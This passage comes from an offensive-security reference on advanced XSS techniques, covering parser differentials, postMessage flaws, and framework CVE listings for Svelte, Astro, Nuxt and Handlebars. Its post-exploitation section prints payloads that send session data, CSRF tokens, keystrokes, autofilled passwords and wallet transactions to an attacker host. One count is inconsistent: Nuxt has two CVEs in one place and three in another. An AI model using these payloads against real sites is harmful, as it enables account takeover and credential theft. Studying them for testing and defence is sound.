- **Foreign-content mutation** — how `<math>` and `<svg>` interact with table repair. Historical Chromium bugs where the insertion-mode logic diverged from spec.
- **Custom-element upgrade timing** — when `attributeChangedCallback` fires vs when `connectedCallback` fires. Chrome and Firefox differ on ordering in nested-upgrade scenarios.
- **Template-tag content parsing** — Chrome and Firefox differ on parsing `<template>` inside `<script>` content.
- **`<noscript>` semantics with scripting disabled** — WebKit's behavior differs from Chrome/Firefox.
- **Character-reference resolution** — the entity table has ~2000+ named entities; each browser's table version may lag WHATWG. Historical CVEs on entity-table divergence.

Test methodology: fuzz an input through multiple browsers; diff the resulting DOM trees; any divergence is a potential bypass source (the sanitizer relied on one browser's parse, the target uses another).

### Fuzzer-Discovered Edge Cases 2024–2026

Public HTML5 parser-differential fuzzers:

- **domparser-fuzzer** — random-input fuzzer that compares DOMParser output across browsers.
- **Cure53's DOMPurify test corpus** — regression tests plus adversarial payloads accumulated over the years.
- **Google's Wycheproof-style testing for browser parsers** — internal, occasionally publishable.

2024–2026 published findings from these tools have added to the mXSS class. Watch the disclosing researcher's writeups on their own domain (Cure53 posts, individual researcher blogs).

### Integration-Point Boundary in Independent Depth

The base file covered SVG/MathML integration points as sanitizer-bypass mechanism. The independent surface:

- **`<foreignObject>` in SVG** — always an HTML integration point.
- **`<title>` and `<desc>` in SVG** — HTML integration points.
- **`<annotation-xml encoding="text/html">` in MathML** — HTML integration point.
- **`<annotation-xml encoding="application/xhtml+xml">`** — same.
- **`<mtext>`, `<mi>`, `<mo>`, `<mn>`, `<ms>` in MathML** — text integration points.

Payloads that transition between namespaces via integration points reach the browser's HTML parser rules inside a foreign-content container. Sanitizers that don't fully model integration-point re-entry produce trees the browser diverges from.

### Adoption Agency Algorithm Quirks

The Adoption Agency Algorithm handles misnested formatting tags (`<b><i>x</b>y</i>` needs restructure). The algorithm is complex; historically the source of parser divergences. In 2024–2026, occasional bugs still surface where a specific misnesting shape produces a different tree across browsers.

Not commonly exploited as an XSS class, but a testing frontier.

### Template Content Parsing

`<template>` content parses as a `DocumentFragment` inserted into `.content`. The parse-in-fragment rules differ from the parse-in-body rules:

- Some elements are legal in fragment but not in body (fragments have looser insertion rules for some tags).
- Nested templates produce nested fragments.
- `<template>` inside `<script>` content — parse behavior varies.

### Declarative Shadow DOM

`<template shadowrootmode="open">` is declarative shadow DOM (shipping in Chrome, spec in WHATWG). The template's content attaches as the parent's shadow root at parse time. This is a novel post-parse tree change:

- Sanitizer sees `<template shadowrootmode="open">...</template>`.
- Browser attaches the template's content as `parent.shadowRoot`.
- Content that was inside the template is now inside the shadow DOM, potentially with different CSS scope and different sanitizer-applicability.

Sanitizers must handle `shadowrootmode` explicitly.

### Custom Element Upgrade Timing (Revisiting)

Custom-element upgrade fires after tree construction. If a custom element's constructor or `connectedCallback` reaches a sink, the timing decouples from sanitization:

- **Upgrade at parse time** — element in DOM before custom-element definition is registered; definition triggers upgrade of already-attached elements.
- **Upgrade at DOM-insert time** — element parsed with definition already registered.
- **Upgrade at attribute-change time** — `attributeChangedCallback` fires when observed attributes change post-attach.

Each timing has different re-sanitization implications.

## Non-HTML Sinks Re-Entering the DOM

The base file's DOM XSS source catalog covers primitive sources. This section is the frontier depth on sink classes where content that isn't HTML at rest becomes HTML at the sink — often bypassing sanitizers that operate on HTML shape.

### JSON-to-innerHTML Pipelines

App fetches JSON, extracts a string field, and sets it as innerHTML. Common pattern:

```javascript
fetch('/api/notification').then(r => r.json()).then(d => {
  document.getElementById('n').innerHTML = d.message;
});
```

The JSON string was safe at network transit; at the DOM sink it's HTML. If `d.message` contains attacker-supplied HTML (from a stored-XSS earlier in the chain), the sink fires.

Framework variants:
- **Angular** `[innerHTML]` binding fed from a JSON response.
- **React** `dangerouslySetInnerHTML` fed from a JSON prop.
- **Vue** `v-html` bound to a JSON field.

### JSON-LD Script Blocks

`<script type="application/ld+json">` blocks embed structured data. The block's content is not JavaScript at parse time — it's JSON. But apps that parse JSON-LD for schema.org processing and re-inject fields into the DOM chain a stored-XSS via the LD block:

```html
<script type="application/ld+json">{"@type":"Article","author":"<img src=x onerror=alert(1)>"}</script>
```

An app that reads `document.querySelector('script[type="application/ld+json"]').textContent`, parses as JSON, and sets `document.title = data.author` — safe. But if it sets `document.getElementById('author').innerHTML = data.author`, XSS.

Also: some JSON-LD frameworks auto-extract fields to the DOM (Google's rich-results processing does not, but some SEO plugins do).

### `iframe.srcdoc`

`<iframe srcdoc="<script>alert(1)</script>">` — the srcdoc renders as an isolated document. The document's origin is inherited from the parent (about:srcdoc), so parent-DOM access via `window.parent` is allowed.

The srcdoc content is a full HTML document; sanitizers that check `<iframe>` for src="javascript:" often don't check srcdoc content. If srcdoc is user-influenced, XSS in the iframe with parent-origin access.

### `data:` URIs in `iframe`/`object`/`window.open`

`<iframe src="data:text/html,<script>alert(1)</script>">` — the data URI's document is loaded with its own origin (opaque origin in modern browsers per spec, though older browsers inherited parent origin). Post-Chrome 60+, opaque origin means the iframe can't reach the parent DOM directly but can navigate and communicate via postMessage.

`window.open("data:text/html,<script>...</script>")` — opens a new tab with the data URI. Same opaque-origin semantics.

Payload class: sanitizer allows `data:` URI in iframe src (some do); attacker-controlled iframe src runs script in the iframe.

### `blob:` URIs

`URL.createObjectURL(new Blob([userHtml], {type: 'text/html'}))` returns a `blob:` URL. Loaded in iframe/window.open, the blob renders as HTML. The origin is the creating origin (not opaque), so parent-DOM access works.

Payload class: any code path that creates a blob URL from user input and loads it as HTML. `<iframe src={blobUrl}>` in a framework binding.

### PDF Embed → JS

`<embed src="attacker.pdf" type="application/pdf">` — the browser's PDF viewer (Chromium's PDFium, Firefox's PDF.js, Safari's WebKit-PDF) may execute JavaScript in the PDF via `/OpenAction` or annotation actions.

- Chromium's PDFium: `/OpenAction /S /JavaScript /JS (app.alert(1))` — historical class; modern PDFium sandboxes JS to a subset (no network, no DOM access).
- Firefox's PDF.js: renders in JS in the parent page's context — historical XSS via PDF.js sandbox escapes.

Payload class: an app that lets users upload PDFs and embeds them via `<embed>` or `<object>` — the PDF's JS is a delayed XSS primitive.

### MathML/SVG Re-Enter

Covered in the parser-differentials section above. When markup re-enters HTML through an integration point, the child content is subject to HTML parsing rules; a sanitizer that treated the child as SVG/MathML misses the re-entry class.

### CSV Formula Injection Reaching Web Preview

`=HYPERLINK("//attacker/x", "text")` — a formula in a CSV cell. If the CSV is opened in Excel or LibreOffice, the formula evaluates. Some web CSV preview tools render the formula's HYPERLINK as an `<a href>` — if the app doesn't sanitize the formula-evaluated URL, XSS.

Less common; documented as a class.

### `<object>` and `<embed>` with Various MIME Types

`<object data="attacker.svg" type="image/svg+xml">` — SVG with `<script>` inside; the SVG's origin is the same as the surrounding document, so the script runs in the parent origin. Sanitizers that allow `<object>` without checking data-URL or MIME must forbid script-executing MIME types.

### CSS `content: url()` and `background-image: url()`

Not directly XSS, but reaches network via URL fetch — potential exfiltration channel and (in older browsers) a script-executing surface. `expression()` in IE was the classic; modern browsers removed it.

## postMessage / COOP / COEP / Cross-Origin Isolation Class Bugs

Cross-origin communication and isolation is a live 2024–2026 frontier. Chrome's `coop-restrict-properties` (documented at `developer.chrome.com/blog/coop-restrict-properties`), Microsoft's "Postmessaged and Compromised" research (`microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised`), and the deprecation of `document.domain` reshape the assessment surface.

### postMessage Origin Validation Gaps

The classic postMessage vulnerability: the recipient doesn't validate `event.origin`, or validates too loosely.

**Missing check**:
```javascript
window.addEventListener('message', e => {
  document.getElementById('content').innerHTML = e.data.html;  // no origin check
});
```

Any origin can send a postMessage; the innerHTML sink fires. XSS by cross-origin message.

**Wildcard `*` allowlist**:
```javascript
window.addEventListener('message', e => {
  if (e.origin === '*') { ... }  // logic error; '*' is not a value of e.origin
  // ... but the check may pass if the developer meant "allow all"
});
```

**Regex too lax**:
```javascript
if (/example\.com/.test(e.origin)) { ... }  // matches "attacker-example.com"
```

**Typos in origin**:
```javascript
if (e.origin === 'https:://example.com') { ... }  // typo; never matches; no messages processed
```

The last is a fail-safe (nothing processes), but if the app has a fallback path (else branch), the typo's else path may run untrusted.

### Confused-Deputy postMessage

A trusted iframe (from parent's own origin, cross-domain via subdomain) sends postMessage to the parent with attacker-crafted content. The parent trusts the origin correctly, but the content came from an attacker (the attacker exploited the iframe's content).

Class shape: iframe with attacker-controlled query params → iframe reads params → iframe sends postMessage → parent trusts origin → parent executes.

### COOP Semantics

Cross-Origin-Opener-Policy governs whether opened windows share the browsing context.

- **`same-origin`** — opener/opened must be same-origin; else opener is nulled.
- **`same-origin-allow-popups`** — same-origin plus allow-popups exception for popups.
- **`unsafe-none`** — no restriction (default).
- **`same-origin-allow-popups-plus-coep`** — extension requiring COEP.

Vulnerability class: an opener that doesn't set COOP inherits the popup-window's ability to reach back via `window.opener.postMessage(...)`. If the popup is on an untrusted origin, and the opener has message handlers, cross-origin message flow reaches the opener.

Mitigation: `Cross-Origin-Opener-Policy: same-origin` on the opener.

### COEP Semantics

Cross-Origin-Embedder-Policy governs whether cross-origin resources can be embedded.

- **`require-corp`** — cross-origin resources must have CORP (Cross-Origin-Resource-Policy) header allowing embedding.
- **`credentialless`** — cross-origin resources are loaded without credentials.

COEP is required to enable cross-origin isolation, which is the gate for `SharedArrayBuffer` and other high-precision-timer APIs.

### Cross-Origin Isolation as `SharedArrayBuffer` Gate

`SharedArrayBuffer` allows shared memory between threads. Combined with `performance.now()` at nanosecond precision, it enables Spectre-shape side-channel attacks (memory disclosure via timing). Post-Spectre, browsers require cross-origin isolation (COOP + COEP) to enable SharedArrayBuffer.

Vulnerability class: an app that intentionally enables cross-origin isolation for SharedArrayBuffer use may have inadvertently strengthened its isolation posture (positive) but also blocked embedding of legitimate cross-origin resources (needs COEP-compliant CORP headers on all deps).

### `document.domain` Deprecation

`document.domain = 'example.com'` historically allowed a subdomain to widen its origin to a parent domain, enabling cross-subdomain scripting. Chrome deprecated `document.domain` (removed in a phased rollout through 2023). Targets that still rely on it broke their isolation model or shipped a `Permissions-Policy: document-domain=(self)` header to opt back in.

Vulnerability class: an app that relies on `document.domain` for legitimate cross-subdomain communication may have opted back in via Permissions-Policy; the opt-in reopens the historical subdomain-XSS class (attacker on `evil.example.com` reaches `www.example.com` DOM).

### Chrome `coop-restrict-properties` Frontier

Chrome's proposal (documented in `developer.chrome.com/blog/coop-restrict-properties`) is a middle-ground COOP mode: cross-origin communication via postMessage is allowed, but direct DOM/window access is blocked. This addresses cases where apps need to communicate with cross-origin resources without fully isolating.

Vulnerability class: an app using `coop-restrict-properties` allows postMessage from cross-origin sources but blocks `.location` access. If the app's postMessage handler doesn't validate origin, the XSS is still available via postMessage. The mode narrows one attack vector while leaving another open.

### Microsoft "Postmessaged and Compromised" Research (2025)

Microsoft's MSRC published in August 2025 (`microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised`) on a research surface of postMessage-based XSS in enterprise apps. Key findings summarized (from the primary source):

- postMessage-based XSS is under-audited relative to reflected-XSS.
- Many apps have message handlers without origin validation or with regex too lax.
- The class scales because cross-origin messaging is a documented, encouraged web-platform feature.

Load the primary source for the specific case studies. The assessment consequence: enumerate every `addEventListener('message', ...)` in the target's bundle; for each, check the origin validation shape.

### GHSA-6738-r8g5-qwp3 — a 2025 postMessage class instance

A published GHSA (surfaced in Batch 3 research at `github.com/advisories/GHSA-6738-r8g5-qwp3`) documents a specific postMessage-based XSS. Verify the advisory against the framework's own tree for version boundary and mechanism.

## XSS as an Authorization Primitive

The base file's post-exploitation section covers session-hijacking impact. This section is the frontier depth — the specific techniques used post-XSS in the post-HttpOnly-era to reach durable impact.

### Post-HttpOnly-Era Session-Token Exfil

Modern apps set session cookies with `HttpOnly` (blocks JavaScript from reading), `Secure` (HTTPS only), `SameSite=Lax` or `Strict` (blocks cross-origin sending). Directly reading `document.cookie` is not the exfil channel.

**Ride-the-existing-session pattern**: instead of exfiltrating the cookie, use it. The XSS runs in the target's origin with the cookie automatically included in `fetch(..., {credentials: 'include'})`:

```javascript
fetch('/api/me', { credentials: 'include' })
  .then(r => r.json())
  .then(d => fetch('//attacker/x', { method: 'POST', body: JSON.stringify(d) }));
```

The exfil is the *user's data*, not the cookie itself. Impact is the account-level actions the XSS performs while riding the session.

### CSP-Report Exfil

CSP violation reports include the blocked URI. Craft violations whose blocked URI encodes secret data:

```javascript
const csrfToken = document.querySelector('input[name=csrf]').value;
// Force a CSP violation whose blocked URI encodes the CSRF token
const img = document.createElement('img');
img.src = `//${csrfToken}/`;  // network fetch → CSP img-src violation → report to configured report-uri
document.body.appendChild(img);
```

The `report-uri` receives a violation report where the blocked URI is `//<csrf-token>/`. If the attacker controls the `report-uri` domain, they receive the token.

Advantage: works even when `connect-src` blocks arbitrary fetches to attacker origin (the violation report is dispatched by the browser, not the script).

### WebRTC Data Channel Exfil

`RTCPeerConnection` allows peer-to-peer connections outside CSP's `connect-src` check. Attacker script:

```javascript
const pc = new RTCPeerConnection();
const dc = pc.createDataChannel('exfil');
// SDP exchange via a bounce server → attacker receives data via WebRTC data channel
```

The signaling requires a bounce server (STUN/TURN); the data channel itself bypasses `connect-src`. Modern browsers may block this if COOP/COEP is set, but many targets don't.

### CSS Keylogger Revivals

CSS-only keylogger — no JavaScript needed:

```css
input[value^="a"] { background: url(//attacker/a); }
input[value^="b"] { background: url(//attacker/b); }
/* ... one rule per possible first character */
input[value^="aa"] { background: url(//attacker/aa); }
/* ... */
```

The browser fetches the background URL when the CSS rule matches (initially, on attribute change). The attacker's server logs which URLs are hit → character-by-character extraction of the input's value.

Class is old (2018 Michal Zalewski / Mike West documented) but still works. Payload: attacker-controlled `<style>` injection reaching the target's login form.

### Service-Worker Persistence

A ServiceWorker registered from the target origin persists across page loads and can intercept every subsequent request. XSS that registers a ServiceWorker gains persistence:

```javascript
navigator.serviceWorker.register('/sw.js');
// sw.js: self.addEventListener('fetch', e => { ... });
```

But `/sw.js` must be from the target's origin. Two paths:
- If the target's static-file server is misconfigured to serve user uploads with `Service-Worker-Allowed` header, upload the SW script.
- If the target has a file-upload endpoint that serves under target origin with .js MIME, upload the SW.

Once registered, the SW intercepts subsequent fetches — even after the XSS payload is gone from the page.

### CSRF Token Exfil

A CSRF token in the DOM (typically a hidden form input) is readable by XSS:

```javascript
const token = document.querySelector('input[name=_csrf]').value;
fetch('/admin/action', {
  method: 'POST',
  credentials: 'include',
  headers: { 'X-CSRF-Token': token },
  body: 'malicious=action'
});
```

The state-changing action performs under the user's session with the correct CSRF token.

### Wallet-Drain via Injected DOM (web3)

For dApps: XSS reaches `window.ethereum` (or the injected wallet API) and can propose transactions:

```javascript
window.ethereum.request({
  method: 'eth_sendTransaction',
  params: [{ from: userAddress, to: attackerAddress, value: '0xffffff...' }]
});
```

The user's wallet extension prompts for approval. If the user is used to approving transactions on this dApp, they may approve without careful review. Additional classes: forge signature requests (`personal_sign`) for authentication bypass.

### Autofill Scraping

Password managers (LastPass, 1Password, Bitwarden, Chrome autofill) fill matching form inputs. An XSS-injected form with matching field names triggers autofill:

```html
<form action="//attacker/x" method="POST">
  <input type="text" name="username" style="display:none">
  <input type="password" name="password" style="display:none">
</form>
```

The autofill fills the hidden fields; a follow-up `document.forms[0].submit()` sends the credentials to the attacker. Password managers have added defenses (visibility checks, cross-origin form action refusal) but classes still exist per-manager.

### Password-Manager Coercion via Autofocus

A more subtle variant: forge a form the user visually sees but with pre-filled hidden fields via autofill. Impersonate a legitimate login page.

### Confirmation Signals

Every XSS-as-authz technique has a distinct confirmation signal:

- Ride-the-session: the attacker's endpoint receives the exfiltrated user data.
- CSP-report exfil: the report-uri endpoint receives the encoded secret.
- WebRTC exfil: the peer connection receives data over the data channel.
- CSS keylogger: attacker's server logs URL fetches character-by-character.
- Service worker: attacker's server receives subsequent request interceptions.
- CSRF token exfil: the state-changing endpoint action succeeds.
- Wallet-drain: a transaction proposal appears in the wallet UI (and, if approved, on-chain).

## Framework Matrix Beyond Angular

Framework anchors beyond Angular are not primary-source-verified here — this section covers the other nine frameworks at primitive-shape depth (`dangerouslySetInnerHTML` / `v-html` / `{@html}` / `set:html` / etc. reaching attacker input), not 2024–2026 CVE-anchored instances. The Angular five-pattern class fingerprint (compile-time-vs-runtime host-binding differential) is Angular-specific; no other framework has a primary-source-verified 2024–2026 CVE of the same class in this pool.

### React (`@facebook:react`, `react-dom`)

- **`dangerouslySetInnerHTML={{__html: user}}`** — the primary sink. Direct DOM injection with no sanitization.
- **`<a href={userUrl}>`** — React ≥16.9 warns for `javascript:` URLs but still renders them. Older versions execute on click. Modern apps typically validate URL scheme in the URL setter.
- **Prop spreading `<div {...userProps}>`** — if userProps is attacker-influenced it can inject `dangerouslySetInnerHTML` or event handlers.
- **`ref` access to raw DOM** — `ref={r => r.innerHTML = user}` — bypasses React's guarding.
- **SSR with `ReactDOMServer.renderToString`** — server-render output injected into a page without the React runtime re-escaping. If the SSR output is served as HTML directly, XSS.
- **React Server Components (React 19)** — the "flight" payload boundary. The base file names CVE-2025-55182 as a pre-auth RCE class; XSS-shape RSC issues exist in the same version range.

### Vue 3 (`vuejs/core`)

- **`v-html`** — the primary sink. Renders raw HTML.
- **`:href="userUrl"`** — Vue 3 does not sanitize `javascript:` URLs by default. Depends on framework version.
- **Dynamic `:is`** — component name from user input.
- **SSR hydration mismatch** — if SSR renders with escaping and client re-renders differently, the hydration path may re-parse.

### Svelte (`sveltejs/svelte`, `sveltejs/kit`)

- **`{@html user}`** — the primary sink; unescaped by design.
- **Dynamic attributes** — `<a href={user}>` renders `javascript:` URLs.
- **Svelte 5 runes** don't change `{@html}` — the sink remains.
- **SvelteKit form-actions** — server-side form actions that return HTML directly.

### Solid (`solidjs/solid`)

- **`innerHTML={user}` prop** — raw sink.
- **`<a href={user}>`** — javascript: URLs render.
- **Solid Start SSR** — similar hydration surface as Svelte.

### htmx (`bigskysoftware/htmx`)

- **`hx-swap="innerHTML"`** — sinks response HTML.
- **`hx-vals='javascript:{...}'`** — explicit JS-eval prefix.
- **`hx-headers='javascript:{...}'`** — same.
- **`hx-on:<event>="js"`** — inline event handlers.
- **`hx-boost`** — hijacks navigation; combined with a target that returns user-influenced HTML, converts navigation to XSS.

### AlpineJS (`alpinejs/alpine`)

Covered in xss_advanced_deep.md § Script Gadget Classes. The primary sinks:
- `x-html`, `x-init`, `x-on:<event>`, `x-bind:<attr>`, `x-model`, `x-data`, `x-show`, `x-if`, `x-for`, `x-text`.
- Version boundary at Alpine v3 (introduced CSP-safe mode).

### LitElement / lit (`lit/lit`)

- **`unsafeHTML` directive** (`lit/directives/unsafe-html`) — the explicit unsafe sink.
- **Template-literal script-shape sinks** — `html\`<script>${user}</script>\`` — lit's html tagged template renders content; script-body reflection depends on lit's context detection.

### Qwik (`BuilderIO/qwik`, `BuilderIO/qwik-city`)

- **`dangerouslySetInnerHTML` prop** — same shape as React.
- **QwikCity server-render** — SSR-serialized props reach the DOM on client hydration.

### Astro (`withastro/astro`)

- **`set:html` directive** — `<div set:html={user}>` renders raw HTML.
- **`is:raw` template escape** — child content not sanitized.
- **`client:load` / `client:visible` component props** — user props reach the client component at hydration.

### Express-middleware reflected-XSS class

Express-family middleware inherits reflected-XSS risk anywhere it constructs HTML responses from user-supplied paths — not framework-matrix items in the frontend-framework sense, but part of the XSS corpus and worth naming here because they are the shape most XSS crawlers surface on Express-shape stacks:

- **CVE-2024-43799** (npm `send`, GHSA-m6fv-jmcg-4jfg, 2024-09) — `SendStream.redirect()` reflected user-controllable URL into the response body without escaping. Attacker-influenced path fragment reaches HTML sink in the Express server's redirect page. Class: reflected template-injection XSS. Primitive: script execution in the target origin on redirect-page render. Fix: escape the reflected URL in the redirect body.
- **CVE-2024-43800** (`expressjs/serve-static`, GHSA-cm22-4g7w-348p, 2024-09) — `response.redirect()` variant with the same class shape in the `serve-static` middleware. Same primitive, same fix pattern.

## Composite Frontier Chains

Named-capability routing:

- **DOMPurify version-specific bypass (specific CVE mechanism) → sanitizer output with live script → in-DOM execution** — routing through the DOMPurify CVE cluster mechanism-by-mechanism section for payload construction.
- **Trusted Types default-policy escape (identity/wrapped/filter-only) → unsanitized value at guarded sink → script execution** — routing through the TT-default-policy-escape frontier for the specific escape shape.
- **Angular five-pattern host-binding misassociation → concrete host mismatch → `javascript:` URL binding → script execution** — routing through the Angular five-pattern depth section per pattern.
- **Engine-deferred mutation (custom-element upgrade / selectedcontent / animation event) → post-sanitize re-mutation → sanitizer never re-walks → script execution** — routing through the engine-deferred-mutation category section.
- **Non-HTML sink re-entering the DOM (JSON-to-innerHTML / JSON-LD / srcdoc / blob / PDF) → HTML-shape rehydration → script execution** — routing through the non-HTML-sinks section.
- **postMessage origin-validation gap → cross-origin message → innerHTML sink → script execution** — routing through the postMessage / COOP / COEP section.
- **XSS primitive → session-riding via fetch-with-credentials → account-level action** — routing through the XSS-as-authz section for the specific exfil technique.
- **Chrome Sanitizer API config-loosening → permissive allowElements/allowAttributes → dangerous element/attribute → script execution** — routing through the Chrome Sanitizer API section.
- **Parser-differential across browsers → target uses browser-A → sanitizer relied on browser-B parse → tree divergence → script execution** — routing through the parser-differentials-as-category section.

Each chain names the capability transferred at each arrow.

## Framework-Matrix — 2024–2026 Per-Framework CVE Depth

Batch-3 gap-closure pass (Batch 7): the pre-existing xss_novel_deep.md had verified CVE anchors for Angular (CVE-2026-88057) and DOMPurify (5 CVEs) but lacked per-framework depth for React, Vue, Svelte, Solid, Qwik, Astro, Next.js, Nuxt, and template engines. This section provides per-framework CVE depth verified against NVD + GHSA in the gap-closure pass. Persisted artifacts at `.zen-batch-artifacts/batch-3-gap-closure-20260929/`.

### React Core Silent Zone (2024–2026)

Explicit finding: **zero verified XSS CVEs in `react` or `react-dom` core packages** during 2024–2026. This is a positive result — React's default text-node escaping and `dangerouslySetInnerHTML`-as-sole-opt-in remain the durable defense.

Ecosystem CVEs exist but are not react-core:
- Gatsby community integrations occasionally surface XSS.
- Next.js (below) has one core CVE.
- react-router, react-router-dom — no verified 2024–2026 core XSS CVEs.

Practical implication: react-core-XSS findings in the field are almost always misuse of `dangerouslySetInnerHTML` or third-party render libraries that bypass React's default escaping; the framework itself is not the vulnerability.

### Next.js CSP-Nonce XSS — CVE-2026-44581

Primitive: Next.js CSP-nonce generation for inline scripts had a specific failure mode that allowed XSS bypass of nonce-based CSP.

**Affected version:**
- Next.js ≥ 13.4.0 < 15.5.16 → fixed 15.5.16.
- Next.js ≥ 16.0.0 < 16.2.5 → fixed 16.2.5.

Version-boundary source: `.zen-batch-artifacts/batch-3-gap-closure-20260929/cve-json/CVE-2026-44581.nvd.json`.

**Mechanism:** the CSP-nonce distribution to client-side hydration scripts had a race or generation-timing issue that produced predictable/reusable nonces. Attacker with a controlled injection point (via a separate XSS surface) could construct a `<script nonce=...>` with the predicted nonce, bypassing the CSP.

**Impact class:** XSS that would have been blocked by the CSP nonce becomes executable. Chain: any injection primitive + CVE-2026-44581 → XSS execution under strict CSP.

### Nuxt 2026 SSR-Link-URL Cluster (2 XSS CVEs)

Two XSS CVEs in the Nuxt SSR pipeline, all in the 2026-06 timeframe:
- **CVE-2026-56317** — nuxt ≥ 4.0.0 < 4.4.7 (fixed 4.4.7) and 3.x line to 3.21.7.
- **CVE-2026-53722** — same version scope.

(CVE-2026-56326, same version scope, is a **server-side open redirect** in `navigateTo` — class `open_redirect`, not XSS. See `open_redirect_novel_deep.md`.)

Both XSS CVEs exhibit the shared pattern: per-slot / per-link gaps in the SSR rendering pipeline. Nuxt's server-side rendering interpolates user data into HTML before hydration; the specific per-CVE mechanism differs in which slot/link fails escaping.

**Class-generalization for Nuxt:**

The SSR pipeline has multiple insertion points; each requires per-context escaping. A framework's SSR-XSS cluster typically reveals a systematic gap where one context was hardened while another was overlooked. Nuxt's cluster is representative.

**Detection:**
- Fingerprint Nuxt version (via `X-Powered-By: Nuxt` or bundle-file naming).
- Match against affected version ranges.
- Probe each SSR-rendered surface with attacker-controlled input.

### Svelte 2024–2026 SSR-XSS Cluster (9 CVEs)

Svelte is the most active XSS-CVE surface in 2024–2026 per the gap-closure research — 9 verified CVEs, with 7 in the 2026 SSR-side cluster:

- **CVE-2024-45047** (`svelte` < 4.2.19; fixed 4.2.19) — mXSS class expression in Svelte's escaping.
- **CVE-2025-15265** (`svelte` 5.46.0-3; fixed 5.46.4).
- **CVE-2026-27119**, **CVE-2026-27121**, **CVE-2026-27122**, **CVE-2026-27901**, **CVE-2026-27902**, **CVE-2026-42573**, **CVE-2026-42599** — 2026 SSR cluster; versions cluster around 5.51.x–5.55.x.

**Mechanism common to the SSR cluster:**

Svelte's SSR pipeline pre-renders components on the server; hydration reconstructs the DOM on the client. XSS in the SSR path fires during server render; XSS during hydration can also occur if the hydration diffing mishandles specific value shapes. The 7-CVE 2026 cluster suggests systematic auditing of the SSR pipeline surfaced multiple per-context escaping gaps.

**Detection:**
- Fingerprint Svelte version — bundle-file naming, `<meta name="svelte-version">` in some builds.
- Match against affected ranges.
- Probe SSR surface with attacker-controlled input.

**Class-generalization:**

The Svelte 2026 cluster is the current archetype for "framework's SSR pipeline audit reveals systematic per-context gaps." Similar patterns are expected across other SSR-native frameworks (Astro — see below; Next.js — CSP-nonce path).

### Astro 2025–2026 Spread/Slot/Directive Cluster (7 CVEs)

Very active surface — 7 verified CVEs across 2025–2026:

- **CVE-2025-65019** — astro fixed 5.15.9.
- **CVE-2026-41067** — fixed 6.1.6.
- **CVE-2026-50146** — fixed 6.3.3.
- **CVE-2026-54298** — fixed 6.4.6.
- **CVE-2026-59729** — fixed 7.0.6.
- **CVE-2026-59727** — fixed 7.0.4.
- **CVE-2026-73422** — fixed 7.1.0.

**Common pattern:** spread-attribute / directive-escaping / slot-content-handling gaps in Astro's island-hydration architecture. Astro's islands architecture (isolated interactive components within static pages) has multiple attribute-flow paths, each of which requires escaping.

**Detection:**
- Fingerprint Astro version (bundle-file names, HTML comments in output).
- Match against affected ranges.
- Probe each island's attribute-injection surface.

### Solid JSX Fragment XSS — CVE-2025-27109

Primitive: `solid-js` < 1.9.4 (fixed 1.9.4) had specific JSX Fragment handling that allowed XSS injection through fragment children.

Version-boundary source: `.zen-batch-artifacts/batch-3-gap-closure-20260929/cve-json/CVE-2025-27109.nvd.json`.

**Mechanism:** JSX Fragment (`<>...</>`) handling in Solid's compiled runtime failed to properly escape children in specific cases, allowing raw HTML injection when the fragment children came from user input.

### Qwik mXSS — CVE-2024-41677

Primitive: `@builder.io/qwik` < 1.7.3 (fixed 1.7.3) exhibited mutation-XSS class behavior — attribute-value sanitization failed to account for browser-side re-parsing that resurrected executable nodes.

**Mechanism:** Qwik's resumability model (SSR + client-side resumption) has specific serialization paths; the mXSS class expression was in one of these serialization paths. Fixed 1.7.3.

### Handlebars AST Type-Confusion Cluster (5 CVEs)

Five CVEs in handlebars 2026-03-27 cluster — all `handlebars` ≥ 4.0.0 ≤ 4.7.8, fixed 4.7.9:
- **CVE-2026-33916**
- **CVE-2026-33937**
- **CVE-2026-33938**
- **CVE-2026-33940**
- **CVE-2026-33941**

**Class:** AST type-confusion — Handlebars' abstract syntax tree parser accepted specific type shapes that the compiled template evaluated as safe but that permitted attacker-controlled expression evaluation. Fixed by tighter type-checking on AST nodes.

**Detection:**
- Fingerprint Handlebars version via `handlebars-<version>.js` bundle naming.
- Match against 4.0.0 ≤ x ≤ 4.7.8 range.

**Class-generalization:**

AST-parser type-confusion is a durable class in template engines — Handlebars' 5-CVE cluster is the current instance. Similar patterns are expected in other AST-based templates (Nunjucks, Pug, Jinja variants).

### EJS + Pug Template-Engine Instances

- **CVE-2024-33883 (EJS < 3.1.10 → 3.1.10)** — pollution-class expression: attacker-controllable options object triggers XSS.
- **CVE-2024-36361 (Pug/pug-code-gen ≤ 3.0.2 → 3.0.3)** — JS injection via specific template patterns.

**Class:** template-engine options-object pollution enabling code injection. Both EJS and Pug had 2024 CVEs with similar shapes. Historical class recurrence in template engines.

### Framework Best-Practice Status (2024–2026)

- **React** — default text-node escaping unchanged; `dangerouslySetInnerHTML` remains sole opt-in sink. Core-package silent zone (0 CVEs).
- **Vue** — default escaping unchanged; `v-html` remains opt-in sink. Only CVE-2024-9506 in vue core (ReDoS, not XSS).
- **Svelte** — most active XSS-CVE surface 2024–2026; 7 of 9 CVEs are SSR-side.
- **Astro** — very active; 7 CVEs across island-hydration attribute paths.
- **Nuxt** — 3-CVE 2026-06 cluster reveals systematic per-slot gaps.
- **Handlebars** — 5-CVE 2026-03 cluster is AST type-confusion class.

## Summary

The 2024–2026 XSS frontier is a durable class landscape rather than a discrete-CVE landscape. The DOMPurify cluster demonstrates the mXSS class doesn't close — each fix patches a specific parser divergence while the class survives via the next divergence; engine-deferred mutation adds a distinct novel category. Compile-time-vs-runtime sanitization differentials (Angular anchor) generalize across frameworks. Every technique class has independent primary-source grounding in Cure53 wiki, W3C specs, browser-vendor posts, and framework advisories — CVEs are instances of the class, not the unit of content.
